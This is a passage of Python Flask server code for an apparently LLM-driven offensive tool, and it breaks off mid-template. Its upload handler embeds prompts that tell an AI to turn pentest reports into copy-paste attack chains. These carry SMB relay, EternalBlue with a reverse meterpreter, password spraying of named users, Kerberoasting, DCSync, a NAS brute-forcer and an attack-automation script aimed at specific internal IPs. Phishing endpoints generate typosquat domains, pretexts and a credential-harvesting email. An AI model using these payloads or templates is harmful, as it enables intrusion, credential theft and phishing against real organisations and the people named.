    db_execute("UPDATE projects SET impact_analysis = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?", (json.dumps(impact_analysis), project_id))
    return jsonify({"osint": osint_data, "impact_analysis": impact_analysis})

@app.route("/api/projects/<project_id>/messages", methods=["GET"])
def get_messages(project_id):
    return jsonify(db_execute("SELECT * FROM messages WHERE project_id = ? ORDER BY created_at ASC", (project_id,), fetchall=True))

@app.route("/api/projects/<project_id>/upload", methods=["POST"])
def upload_file(project_id):
    """Upload and analyze any file including images - with smart security analysis"""
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No file selected"}), 400
    
    # Read file content
    filename = file.filename
    file_type = filename.rsplit('.', 1)[-1].lower() if '.' in filename else 'txt'
    file_bytes = file.read()
    file_size = len(file_bytes)
    
    # Image types
    image_types = ['png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp', 'tiff']
    
    # Check if it is an image
    if file_type in image_types:
        import base64
        base64_image = base64.b64encode(file_bytes).decode('utf-8')
        
        mime_map = {
            'png': 'image/png', 'jpg': 'image/jpeg', 'jpeg': 'image/jpeg',
            'gif': 'image/gif', 'webp': 'image/webp', 'bmp': 'image/bmp', 'tiff': 'image/tiff'
        }
        mime_type = mime_map.get(file_type, 'image/png')
        
        return jsonify({
            "success": True, "filename": filename, "file_type": file_type,
            "is_image": True, "mime_type": mime_type, "base64": base64_image,
            "content_length": file_size,
            "analysis_prompt": f"I've uploaded an image: {filename}. Analyze this for security-relevant information: network diagrams, credentials, infrastructure, org charts, screenshots of systems, or any recon data. Then suggest next steps based on what you find."
        })
    
    # Text-based files
    content = ""
    try:
        if file_type in ['txt', 'md', 'csv', 'json', 'xml', 'html', 'log', 'conf', 'cfg', 'ini', 'yml', 'yaml', 'sh', 'bat', 'ps1', 'py', 'js', 'php', 'sql', 'env', 'nmap', 'gnmap', 'lst', 'out']:
            content = file_bytes.decode('utf-8', errors='ignore')
        elif file_type == 'pdf':
            try:
                import PyPDF2
                import io
                pdf_reader = PyPDF2.PdfReader(io.BytesIO(file_bytes))
                content = "\n".join([page.extract_text() or "" for page in pdf_reader.pages[:30]])
            except Exception as e:
                content = f"[PDF file extraction failed: {str(e)}]"
        elif file_type in ['doc', 'docx']:
            # Try multiple extraction methods
            extraction_method = "none"
            try:
                import docx
                import io
                doc = docx.Document(io.BytesIO(file_bytes))
                
                # Extract paragraphs
                paragraphs = [para.text for para in doc.paragraphs if para.text.strip()]
                
                # Extract tables (CRITICAL for pentest reports!)
                table_content = []
                for i, table in enumerate(doc.tables):
                    table_content.append(f"\n=== TABLE {i+1} ===")
                    for row in table.rows:
                        row_data = [cell.text.strip() for cell in row.cells]
                        if any(row_data):
                            table_content.append(" | ".join(row_data))
                
                content = "\n".join(paragraphs) + "\n" + "\n".join(table_content)
                extraction_method = "python-docx"
                
                # Verify we got content
                if len(content.strip()) < 100:
                    raise Exception("Content too short, trying fallback")
                    
            except Exception as e:
                # Fallback 1: Extract text from XML inside docx
                try:
                    import zipfile
                    import io
                    import re
                    
                    with zipfile.ZipFile(io.BytesIO(file_bytes), 'r') as z:
                        # Get document.xml which contains the main text
                        if 'word/document.xml' in z.namelist():
                            doc_xml = z.read('word/document.xml').decode('utf-8', errors='ignore')
                            # Remove XML tags but keep text
                            text_content = re.sub(r'<[^>]+>', ' ', doc_xml)
                            # Clean up whitespace
                            text_content = re.sub(r'\s+', ' ', text_content).strip()
                            content = text_content
                            extraction_method = "xml-fallback"
                except Exception as e2:
                    pass
                
                # Fallback 2: Raw strings extraction
                if not content or len(content.strip()) < 100:
                    try:
                        # Extract readable strings from the binary
                        raw_text = file_bytes.decode('utf-8', errors='ignore')
                        # Look for text between common patterns
                        import re
                        strings = re.findall(r'[\x20-\x7E]{10,}', raw_text)
                        content = "\n".join(strings[:500])  # Limit to first 500 strings
                        extraction_method = "strings-fallback"
                    except:
                        content = f"[Word doc extraction failed after all methods. Original error: {str(e)}. Install: pip install python-docx]"
                        extraction_method = "failed"
            
            # Log extraction method for debugging
            if extraction_method != "failed":
                content = f"[Extraction method: {extraction_method}]\n\n{content}"
        elif file_type in ['xls', 'xlsx']:
            try:
                import pandas as pd
                import io
                df = pd.read_excel(io.BytesIO(file_bytes))
                content = df.to_string()[:15000]
            except:
                content = "[Excel file - install pandas openpyxl]"
        else:
            hex_preview = file_bytes[:500].hex()
            content = f"[Binary file: {filename}]\nSize: {file_size} bytes\nHex:\n{hex_preview}"
    except Exception as e:
        content = f"[Error reading file: {str(e)}]"
    
    # SMART FILE TYPE DETECTION for security analysis
    content_lower = content.lower()
    detected_type = "generic"
    analysis_context = ""
    
    # PENTEST REPORT / Security Assessment
    if any(x in content_lower for x in ['penetration test', 'pentest', 'security assessment', 'interim report', 'vulnerability assessment', 'week 1', 'week 2']) and any(x in content_lower for x in ['findings', 'severity', 'high', 'medium', 'low', 'critical', 'poc', 'proof of concept', 'smb', 'rdp', 'domain']):
        detected_type = "pentest_report"
        analysis_context = """
## PENTEST REPORT DETECTED - FULL ATTACK CONTINUATION MODE

**THE DOCUMENT IS ALREADY EXTRACTED BELOW. ANALYZE IT AND PROVIDE ATTACK COMMANDS.**

You are continuing a penetration test. The Week 1 report is below. Your job:
1. Parse ALL findings (IPs, hostnames, vulnerabilities, usernames)
2. Provide EXACT copy-paste commands for Week 2 exploitation
3. Generate custom scripts when standard tools are insufficient
4. Chain attacks logically toward Domain Admin and data exfiltration

---
## RESPONSE FORMAT (FOLLOW EXACTLY)

### FINDINGS EXTRACTION
First, extract and list:
```
DOMAIN: [extract from report]
DOMAIN CONTROLLERS: [IPs from report]
USERNAMES FOUND: [list all]
HIGH-SEVERITY TARGETS: [IPs + vulnerability]
SMB RELAY TARGETS: [if mentioned]
CREDENTIALS FOUND: [any passwords/hashes]
```

### ATTACK CHAIN (Week 2)

For EACH attack, provide:
1. **Prerequisites** - What we need (and confirm we have it from report)
2. **Target** - Specific IP/hostname from report
3. **Commands** - EXACT copy-paste, using variables for attacker IP only
4. **Expected Output** - What success looks like
5. **Next Step** - What this enables

---
## ATTACK TEMPLATES (USE THESE EXACT COMMANDS)

### IF SMB SIGNING DISABLED (24 hosts without signing):
```bash
# STEP 1: Create target list from report findings
cat << 'EOF' > smb_targets.txt
172.25.1.26
172.25.1.14
172.25.1.230
172.25.1.228
EOF

# STEP 2: Start Responder (Terminal 1)
sudo responder -I tun0 -wrf

# STEP 3: Start ntlmrelayx (Terminal 2)
# Option A: Dump SAM hashes from relayed auth
ntlmrelayx.py -tf smb_targets.txt -smb2support

# Option B: Execute command on relay
ntlmrelayx.py -tf smb_targets.txt -smb2support -c "whoami > C:\\\\windows\\\\temp\\\\pwned.txt"

# Option C: Start SOCKS proxy for tool pivoting
ntlmrelayx.py -tf smb_targets.txt -smb2support -socks

# STEP 4: Trigger auth - send email or wait for LLMNR/NBNS traffic
# Check Responder logs for captured hashes
```

### IF WINDOWS 2008 R2 FOUND (EOL servers):
```bash
# Check for EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p445 172.25.1.26 172.25.1.14

# If vulnerable, exploit:
msfconsole -q << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.25.1.26
set LHOST <YOUR_IP>
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_https
run
EOF

# Post-exploitation after shell:
# meterpreter> hashdump
# meterpreter> load kiwi
# meterpreter> creds_all
```

### IF USERNAMES FOUND (for password spray):
```bash
# Create user list from report
cat << 'EOF' > users.txt
administrator
admin
wapa
herwigdessers
livia
gitta
jan.panis
stefaan.geuens
peter.lepage
joren.deknop
EOF

# Create password list (common patterns + company name)
cat << 'EOF' > passwords.txt
Winter2024!
Winter2025!
Ebema2024!
Ebema2025!
Welcome2024!
Welcome2025!
Password123!
P@ssw0rd!
EOF

# Spray against SMB (1 password at a time to avoid lockout!)
nxc smb 172.25.1.69 -u users.txt -p 'Winter2024!' --continue-on-success

# If valid creds found, enumerate:
nxc smb 172.25.1.69 -u 'validuser' -p 'validpass' --users
nxc smb 172.25.1.69 -u 'validuser' -p 'validpass' --shares
nxc smb 172.25.1.69 -u 'validuser' -p 'validpass' --pass-pol
```

### IF DOMAIN CREDS OBTAINED:
```bash
# Set variables (replace with actual values from spray/relay)
export DOMAIN="ebema.local"
export DC_IP="172.25.1.69"
export USER="compromised_user"
export PASS="their_password"

# Kerberoast all service accounts
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerberoast.txt

# AS-REP roast accounts without preauth
GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack offline (run on your GPU machine)
hashcat -m 13100 kerberoast.txt rockyou.txt -r best64.rule
hashcat -m 18200 asrep.txt rockyou.txt

# Enumerate AD with BloodHound
bloodhound-python -u $USER -p $PASS -d $DOMAIN -dc $DC_IP -c All --zip

# Check for delegation issues
findDelegation.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP
```

### IF ADMIN HASH/CREDS OBTAINED:
```bash
# Pass-the-Hash to any machine
psexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET

# Or with password
psexec.py $DOMAIN/$USER:$PASS@$TARGET

# Dump more creds from that machine
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET

# If Domain Admin, DCSync everything
secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP -just-dc
```

### IF SYNOLOGY NAS FOUND:
```bash
# Default creds check
curl -sk "https://172.25.1.22:5001/webapi/auth.cgi?api=SYNO.API.Auth&version=3&method=login&account=admin&passwd=admin"

# Brute force (use custom script below)
```

---
## CUSTOM SCRIPTS (GENERATE WHEN NEEDED)

### Synology NAS Brute Forcer:
```python
#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

targets = ["172.25.1.22", "172.25.1.24", "172.25.1.50", "172.25.1.51"]
users = ["admin", "root", "administrator", "backup", "nas"]
passwords = ["admin", "password", "synology", "backup", "123456", "qwerty"]

for target in targets:
    print(f"[*] Testing {target}")
    for user in users:
        for pwd in passwords:
            try:
                r = requests.get(
                    f"https://{target}:5001/webapi/auth.cgi",
                    params={"api": "SYNO.API.Auth", "version": "3", "method": "login", "account": user, "passwd": pwd},
                    verify=False, timeout=5
                )
                if '"success":true' in r.text:
                    print(f"[+] FOUND: {target} - {user}:{pwd}")
            except: pass
```

### Domain User Enumerator (via Null Session):
```python
#!/usr/bin/env python3
import subprocess
import re

DC_IP = "172.25.1.69"  # From report

# Try null session enumeration
result = subprocess.run(
    ["rpcclient", "-U", "", "-N", DC_IP, "-c", "enumdomusers"],
    capture_output=True, text=True
)

if result.returncode == 0:
    users = re.findall(r'user:\\[([^\\]]+)\\]', result.stdout)
    print(f"[+] Found {len(users)} domain users:")
    for u in users:
        print(f"    {u}")
    with open("domain_users.txt", "w") as f:
        f.write("\\n".join(users))
else:
    print("[-] Null session failed, trying with creds...")
```

### Automated Attack Chain Script:
```python
#!/usr/bin/env python3
\"\"\"
XPOSE Attack Chain Automator
Chains: Spray -> Kerberoast -> Crack -> Lateral Movement
\"\"\"
import subprocess
import os

# CONFIG - Update from report
DOMAIN = "ebema.local"
DC_IP = "172.25.1.69"
USERS_FILE = "users.txt"
PASSWORDS = ["Winter2024!", "Ebema2024!", "Welcome2024!"]

def spray():
    print("[*] Phase 1: Password Spray")
    for pwd in PASSWORDS:
        print(f"[*] Trying: {pwd}")
        result = subprocess.run(
            ["nxc", "smb", DC_IP, "-u", USERS_FILE, "-p", pwd, "--continue-on-success"],
            capture_output=True, text=True
        )
        if "[+]" in result.stdout and "STATUS_LOGON_FAILURE" not in result.stdout:
            # Parse successful login
            for line in result.stdout.split("\\n"):
                if "[+]" in line and pwd in line:
                    print(f"[+] VALID: {line}")
                    return line  # Return first valid cred
    return None

def kerberoast(user, pwd):
    print("[*] Phase 2: Kerberoasting")
    subprocess.run([
        "GetUserSPNs.py", f"{DOMAIN}/{user}:{pwd}",
        "-dc-ip", DC_IP, "-request", "-outputfile", "kerberoast.txt"
    ])
    if os.path.exists("kerberoast.txt"):
        print("[+] Kerberoast hashes saved to kerberoast.txt")
        print("[*] Crack with: hashcat -m 13100 kerberoast.txt rockyou.txt")

def bloodhound(user, pwd):
    print("[*] Phase 3: BloodHound Collection")
    subprocess.run([
        "bloodhound-python", "-u", user, "-p", pwd,
        "-d", DOMAIN, "-dc", DC_IP, "-c", "All", "--zip"
    ])

if __name__ == "__main__":
    cred = spray()
    if cred:
        # Parse user:pass from nxc output
        # Format: SMB  172.25.1.69  445  DC  [+] ebema.local\\user:pass
        parts = cred.split("\\\\")[-1].split(":")
        user, pwd = parts[0], parts[1].split()[0]
        kerberoast(user, pwd)
        bloodhound(user, pwd)
```

---
## CRITICAL REMINDERS

1. **USE REPORT DATA** - All IPs, usernames, and findings are in the document below
2. **COPY-PASTE READY** - Commands should work immediately (only change $LHOST to attacker IP)
3. **CHAIN LOGICALLY** - Each attack enables the next
4. **INCLUDE CLEANUP** - After each phase, note what artifacts to remove
5. **OPSEC NOTES** - Flag high-risk commands that might trigger alerts

**NOW READ THE REPORT BELOW AND PROVIDE THE ATTACK CHAIN:**
"""
    
    # Nmap / Port Scan Results
    elif any(x in content_lower for x in ['nmap scan report', 'open port', 'filtered port', 'host is up', '/tcp', '/udp', 'service detection']):
        detected_type = "nmap_scan"
        analysis_context = """
## NMAP SCAN DETECTED - ATTACK CHAINING MODE

Analyze this scan and provide:
1. **Critical Findings**: List all open ports with services
2. **Vulnerability Assessment**: For each service, identify known CVEs and exploits
3. **Immediate Attack Vectors**: Exact exploit commands (Metasploit, manual exploits)
4. **Prioritized Attack Plan**: Order targets by likelihood of success
5. **Credential Attacks**: If SMB/RDP/SSH found, suggest credential attacks
6. **Lateral Movement Prep**: How these services enable pivoting

For EACH exploitable service, provide:
```bash
# Exact exploit command
msfconsole -q -x "use exploit/xxx; set RHOSTS x.x.x.x; run"
```
"""
    
    # Credential Dumps (mimikatz, secretsdump, hashdump)
    elif any(x in content_lower for x in ['ntlm', 'lmhash', 'nthash', '::::', 'mimikatz', 'sekurlsa', 'wdigest', 'kerberos ticket', 'krbtgt', 'aes256_hmac', 'rc4_hmac']):
        detected_type = "credential_dump"
        analysis_context = """
## CREDENTIAL DUMP DETECTED - LATERAL MOVEMENT MODE

Analyze these credentials and provide:
1. **Credential Inventory**: List all users, hashes, passwords found
2. **High-Value Targets**: Identify admin/service accounts
3. **Pass-the-Hash Commands**: Exact PTH commands for each hash
4. **Pass-the-Ticket**: If Kerberos tickets found, provide PTT commands
5. **Lateral Movement Plan**: Which systems to target with these creds
6. **Privilege Escalation**: Can any creds get Domain Admin?

Provide EXACT commands:
```powershell
# Pass-the-Hash with found NTLM
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:cmd
# Or with Impacket
psexec.py -hashes :NTLM_HASH domain/user@target
```
"""
    
    # BloodHound / AD Enumeration
    elif any(x in content_lower for x in ['bloodhound', 'sharphound', 'azurehound', 'shortest path', 'domain admins', 'kerberoastable', 'asreproastable', 'dcsync', 'owns', 'genericall', 'writedacl']):
        detected_type = "bloodhound_data"
        analysis_context = """
## BLOODHOUND/AD DATA DETECTED - DOMAIN ESCALATION MODE

Analyze this AD data and provide:
1. **Attack Paths to DA**: Shortest paths to Domain Admin
2. **Kerberoastable Accounts**: List SPNs to target
3. **AS-REP Roastable**: Accounts without pre-auth
4. **ACL Abuse Paths**: GenericAll, WriteDACL, WriteOwner chains
5. **Delegation Abuse**: Constrained/Unconstrained delegation
6. **Exact Commands**: For each attack path

```powershell
# Kerberoasting identified accounts
Rubeus.exe kerberoast /user:TARGET_SPN /nowrap

# AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP
```
"""
    
    # Password Lists / Wordlists
    elif file_type in ['lst', 'txt'] and (len(content.split('\n')) > 50 and all(len(line) < 100 for line in content.split('\n')[:100])):
        detected_type = "password_list"
        analysis_context = """
## PASSWORD LIST DETECTED - CREDENTIAL ATTACK MODE

Use this wordlist for:
1. **Password Spraying**: Commands for AD password spray
2. **Brute Force Targets**: Based on previous OSINT, which services to hit
3. **Custom Mutations**: Suggest mutations based on target company name
4. **Hashcat Rules**: If we have hashes, provide cracking commands

```bash
# Password spray with list
crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success
# Hashcat with rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```
"""
    
    # Web Application Scan (Burp, Nikto, etc.)
    elif any(x in content_lower for x in ['burp', 'nikto', 'vulnerability', 'injection', 'xss', 'sqli', 'csrf', 'http request', 'http response', 'cookie:', 'set-cookie']):
        detected_type = "web_scan"
        analysis_context = """
## WEB SCAN DETECTED - WEB EXPLOITATION MODE

Analyze and provide:
1. **Vulnerabilities Found**: List all with severity
2. **Exploitation Commands**: SQLMap, XSS payloads, etc.
3. **Authentication Bypass**: If login found, suggest attacks
4. **File Upload Abuse**: If upload found, provide shell upload
5. **API Exploitation**: If APIs found, suggest attacks

```bash
# SQLi exploitation
sqlmap -u "URL" --dbs --batch
# File upload bypass
# XSS payload for cookie theft
```
"""
    
    # Config Files
    elif any(x in content_lower for x in ['password=', 'passwd=', 'pwd=', 'secret=', 'api_key=', 'apikey=', 'connectionstring', 'jdbc:', 'mongodb://', 'mysql://']):
        detected_type = "config_file"
        analysis_context = """
## CONFIG FILE WITH SECRETS DETECTED

Extract and analyze:
1. **Credentials Found**: All passwords, API keys, connection strings
2. **Service Identification**: What services do these creds access?
3. **Immediate Access Commands**: How to use these creds NOW
4. **Pivot Opportunities**: What additional access do we gain?

```bash
# Test extracted credentials
mysql -h HOST -u USER -p'PASSWORD'
psql -h HOST -U USER -d DATABASE
```
"""
    
    # Linux Enumeration (linpeas, linenum)
    elif any(x in content_lower for x in ['linpeas', 'linenum', 'suid', 'sgid', '/etc/passwd', '/etc/shadow', 'sudo -l', 'capabilities', 'crontab']):
        detected_type = "linux_enum"
        analysis_context = """
## LINUX ENUMERATION DETECTED - PRIVESC MODE

Analyze for privilege escalation:
1. **SUID/SGID Binaries**: GTFOBins exploits for each
2. **Sudo Permissions**: Exploitable sudo rules
3. **Cron Jobs**: Writable scripts or PATH hijack
4. **Capabilities**: Exploitable caps
5. **Kernel Version**: Applicable kernel exploits

```bash
# Exact privesc commands for findings
```
"""
    
    # Windows Enumeration (winpeas, powerup)
    elif any(x in content_lower for x in ['winpeas', 'powerup', 'unquoted service', 'alwaysinstallelevated', 'autologon', 'cached credentials', 'seimpersonate', 'sedebug']):
        detected_type = "windows_enum"
        analysis_context = """
## WINDOWS ENUMERATION DETECTED - PRIVESC MODE

Analyze for privilege escalation:
1. **Service Exploits**: Unquoted paths, weak permissions
2. **Token Privileges**: SeImpersonate, SeDebug abuse
3. **Credential Harvesting**: Cached creds, autologon
4. **UAC Bypass**: Applicable techniques
5. **Exact Exploits**: Commands for each finding

```powershell
# Potato attack for SeImpersonate
# Service binary hijack
```
"""
    
    # Email/Phishing Targets
    elif any(x in content_lower for x in ['@', 'email', 'mail']) and content.count('@') > 5:
        detected_type = "email_list"
        analysis_context = """
## EMAIL LIST DETECTED - SOCIAL ENGINEERING MODE

Analyze and provide:
1. **High-Value Targets**: Executives, IT, Finance identified
2. **Email Patterns**: Naming convention detected
3. **Phishing Campaign**: Tailored pretext for this org
4. **Credential Harvesting**: Evilginx2 phishlet setup
5. **Spray Targets**: Format usernames for password spray
"""
    
    analysis_request = f"""
## Uploaded File Analysis
**Filename:** {filename}
**Type:** {file_type}
**Detected Category:** {detected_type.upper()}
**Size:** {file_size} bytes

{analysis_context}

### File Content:
```
{content[:25000]}
```
{"[... truncated ...]" if len(content) > 25000 else ""}

**IMPORTANT**: Analyze this data and provide ACTIONABLE next steps with EXACT commands. Chain this with any previous findings. This is real engagement data - treat it as such and suggest the logical next attack phase.
"""
    
    return jsonify({
        "success": True,
        "filename": filename,
        "file_type": file_type,
        "detected_category": detected_type,
        "is_image": False,
        "content_length": len(content),
        "analysis_prompt": analysis_request,
        "content_preview": content[:5000]
    })

@app.route("/api/projects/<project_id>/chat", methods=["POST"])
def chat(project_id):
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid JSON data"}), 400
            
        user_message = data.get("message", "")
        image_data = data.get("image")  # Base64 image data
        image_mime = data.get("image_mime", "image/png")
        
        if not user_message and not image_data: 
            return jsonify({"error": "Message or image required"}), 400
        
        project = db_execute("SELECT * FROM projects WHERE id = ?", (project_id,), fetchone=True)
        if not project: 
            return jsonify({"error": "Project not found"}), 404
        
        history = db_execute("SELECT role, content FROM messages WHERE project_id = ? ORDER BY created_at ASC", (project_id,), fetchall=True)
        osint_record = db_execute("SELECT data FROM osint_data WHERE project_id = ? ORDER BY created_at DESC LIMIT 1", (project_id,), fetchone=True)
        osint_data = json.loads(osint_record.get("data", "{}")) if osint_record else {}
        impact_analysis = json.loads(project.get("impact_analysis", "{}")) if project.get("impact_analysis") else {}
        knowledge = load_knowledge()
        
        if project["type"] == "apt":
            system_prompt = APT_SYSTEM_PROMPT.format(
                target_info=f"Target: {project['target']}\nProject: {project['name']}", 
                osint_data=format_osint_for_prompt(osint_data), 
                impact_analysis=format_impact_for_prompt(impact_analysis), 
                knowledge=knowledge
            )
        else:
            framework = PENTEST_FRAMEWORKS.get(project.get("framework", ""), {})
            system_prompt = PENTEST_SYSTEM_PROMPT.format(
                framework_name=framework.get("name", "General"), 
                current_item="General testing", 
                item_description="", 
                suggested_commands="", 
                knowledge=knowledge
            )
        
        messages = [{"role": "system", "content": system_prompt}]
        for h in history[-30:]: 
            messages.append({"role": h["role"], "content": h["content"]})
        
        # Handle image in message
        if image_data:
            user_content = [
                {"type": "text", "text": user_message or "Please analyze this image for security-relevant information."}
            ]
            user_content.append({
                "type": "image_url",
                "image_url": {"url": f"data:{image_mime};base64,{image_data}"}
            })
            messages.append({"role": "user", "content": user_content})
            db_message = f"[Image uploaded]\n{user_message}" if user_message else "[Image uploaded for analysis]"
        else:
            messages.append({"role": "user", "content": user_message})
            db_message = user_message
        
        # Save user message before streaming
        db_execute("INSERT INTO messages (project_id, role, content) VALUES (?, ?, ?)", (project_id, "user", db_message))
        
        if USE_STREAMING:
            db_path = DATABASE
            
            def generate():
                full_response = []
                try:
                    for chunk in call_llm_streaming(messages):
                        full_response.append(chunk)
                        yield f"data: {json.dumps({'content': chunk})}\n\n"
                    response_text = "".join(full_response)
                    try:
                        import sqlite3
                        conn = sqlite3.connect(db_path)
                        cursor = conn.cursor()
                        cursor.execute("INSERT INTO messages (project_id, role, content) VALUES (?, ?, ?)", (project_id, "assistant", response_text))
                        cursor.execute("UPDATE projects SET updated_at = CURRENT_TIMESTAMP WHERE id = ?", (project_id,))
                        conn.commit()
                        conn.close()
                    except Exception as db_err:
                        print(f"DB save error: {db_err}")
                    yield f"data: {json.dumps({'done': True})}\n\n"
                except Exception as e: 
                    yield f"data: {json.dumps({'error': str(e)})}\n\n"
            return Response(generate(), mimetype='text/event-stream')
        else:
            response = call_llm_sync(messages)
            db_execute("INSERT INTO messages (project_id, role, content) VALUES (?, ?, ?)", (project_id, "assistant", response))
            db_execute("UPDATE projects SET updated_at = CURRENT_TIMESTAMP WHERE id = ?", (project_id,))
            return jsonify({"response": response})
            
    except Exception as e:
        import traceback
        print(f"Chat endpoint error: {traceback.format_exc()}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/osint/quick", methods=["POST"])
def quick_osint():
    data = request.json
    target = data.get("target", "")
    if not target: return jsonify({"error": "Target required"}), 400
    osint_data = gather_comprehensive_osint(target)
    industry = detect_industry(target, osint_data)
    impact_analysis = calculate_impact_analysis(target, osint_data, industry)
    return jsonify({"osint": osint_data, "impact_analysis": impact_analysis})

@app.route("/api/frameworks", methods=["GET"])
def get_frameworks():
    return jsonify(PENTEST_FRAMEWORKS)

@app.route("/api/industries", methods=["GET"])
def get_industries():
    return jsonify(INDUSTRY_PROFILES)

@app.route("/api/phishing/domains", methods=["POST"])
def research_phishing_domains():
    """Generate typosquatting domains for phishing campaigns"""
    data = request.get_json()
    domain = data.get("domain", "")
    if not domain:
        return jsonify({"error": "Domain required"}), 400
    
    # Clean domain
    domain = re.sub(r'^https?://', '', domain).split('/')[0].lower()
    
    # Generate variations
    variations = generate_typosquat_domains(domain)
    
    # Check availability if requested
    if data.get("check_availability", False):
        domains_to_check = [v["domain"] for v in variations["variations"][:30]]
        availability = check_domain_availability(domains_to_check)
        variations["availability"] = availability
    
    return jsonify(variations)

@app.route("/api/phishing/profile", methods=["POST"])
def generate_phishing_profile():
    """Generate a phishing target profile from OSINT"""
    data = request.get_json()
    target_email = data.get("email", "")
    target_name = data.get("name", "")
    company = data.get("company", "")
    
    profile = {
        "target": {
            "email": target_email,
            "name": target_name,
            "company": company
        },
        "email_pattern": "",
        "suggested_pretexts": [],
        "domain_variations": [],
        "phishing_templates": []
    }
    
    # Extract domain from email
    if target_email and "@" in target_email:
        domain = target_email.split("@")[1]
        profile["domain"] = domain
        
        # Get email pattern from Hunter.io
        if HUNTER_API_KEY:
            try:
                r = requests.get(f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={HUNTER_API_KEY}", timeout=30)
                if r.status_code == 200:
                    hunter_data = r.json().get("data", {})
                    profile["email_pattern"] = hunter_data.get("pattern", "")
                    profile["organization"] = hunter_data.get("organization", "")
                    profile["executives"] = [e for e in hunter_data.get("emails", []) if e.get("type") == "executive"][:10]
            except:
                pass
        
        # Generate domain variations
        variations = generate_typosquat_domains(domain)
        profile["domain_variations"] = variations["variations"][:20]
    
    # Suggest pretexts based on context
    pretexts = [
        {"name": "IT Password Reset", "urgency": "high", "success_rate": "65%", "description": "Password expiration notice with fake portal"},
        {"name": "HR Payroll Issue", "urgency": "high", "success_rate": "55%", "description": "Payroll discrepancy requiring verification"},
        {"name": "Vendor Invoice", "urgency": "medium", "success_rate": "45%", "description": "Overdue invoice with updated bank details"},
        {"name": "Executive Request", "urgency": "high", "success_rate": "40%", "description": "CEO/CFO requesting urgent action"},
        {"name": "Delivery Notification", "urgency": "low", "success_rate": "35%", "description": "Package delivery requiring address confirmation"},
        {"name": "MFA Reset", "urgency": "high", "success_rate": "60%", "description": "MFA token expiration requiring re-enrollment"},
        {"name": "Shared Document", "urgency": "medium", "success_rate": "50%", "description": "OneDrive/SharePoint document requiring login"},
        {"name": "Meeting Invite", "urgency": "medium", "success_rate": "45%", "description": "Calendar invite with malicious link"}
    ]
    profile["suggested_pretexts"] = pretexts
    
    return jsonify(profile)

@app.route("/api/phishing/template", methods=["POST"])
def generate_phishing_template():
    """Generate a customized professional HTML phishing email template"""
    data = request.get_json()
    template_type = data.get("type", "it_password")
    target_name = data.get("target_name", "John Smith")
    target_company = data.get("target_company", "Acme Corporation")
    target_email = data.get("target_email", "john.smith@acme.com")
    attacker_domain = data.get("attacker_domain", "secure-portal.com")
    sender_name = data.get("sender_name", "")
    sender_title = data.get("sender_title", "")
    
    first_name = target_name.split()[0] if ' ' in target_name else target_name
    company_clean = target_company.lower().replace(' ', '').replace(',', '').replace('.', '')
    current_date = datetime.now().strftime("%B %d, %Y")
    
    # Professional HTML Email Templates
    templates = {
        "it_password": {
            "subject": f"[Action Required] Password Expiration Notice - {target_company}",
            "from_name": "IT Security",
            "from_email": f"it-security@{attacker_domain}",
            "reply_to": f"helpdesk@{attacker_domain}",
            "headers": {
                "X-Mailer": "Microsoft Outlook 16.0",
                "X-Priority": "1",
                "X-MSMail-Priority": "High"
            },
            "html": f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
    
    <!-- Header -->
    <div style="background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%); padding: 30px; text-align: center;">
        <img src="https://logo.clearbit.com/{company_clean}.com" alt="{target_company}" style="height: 50px; margin-bottom: 15px;" onerror="this.style.display='none'">
        <h1 style="color: white; margin: 0; font-size: 24px; font-weight: 400;">{target_company}</h1>
        <p style="color: rgba(255,255,255,0.8); margin: 5px 0 0 0; font-size: 14px;">IT Security Department</p>
    </div>
    
    <!-- Alert Banner -->
    <div style="background: #fff4e5; border-left: 4px solid #ff9800; padding: 15px 20px; margin: 0;">
        <p style="margin: 0; color: #663c00; font-size: 14px;">
            <strong>[!] Security Notice:</strong> Your password will expire in <strong>24 hours</strong>
        </p>
    </div>
    
    <!-- Content -->
    <div style="padding: 30px;">
        <p style="color: #333; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
            Dear {first_name},
        </p>
        
        <p style="color: #555; font-size: 15px; line-height: 1.7; margin: 0 0 20px 0;">
            In accordance with {target_company} security policy, your corporate password is set to expire on <strong>{(datetime.now() + timedelta(days=1)).strftime("%B %d, %Y at %I:%M %p")}</strong>.
        </p>
        
        <p style="color: #555; font-size: 15px; line-height: 1.7; margin: 0 0 25px 0;">
            To ensure uninterrupted access to all corporate systems, please update your password before the expiration date using the secure portal below:
        </p>
        
        <!-- CTA Button -->
        <div style="text-align: center; margin: 30px 0;">
            <a href="https://sso.{attacker_domain}/auth/{target_email.replace('@', '%40')}" 
               style="display: inline-block; background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%); color: white; text-decoration: none; padding: 15px 40px; border-radius: 5px; font-size: 16px; font-weight: 500; box-shadow: 0 3px 10px rgba(0,120,212,0.3);">
                Update Password Now
            </a>
        </div>
        
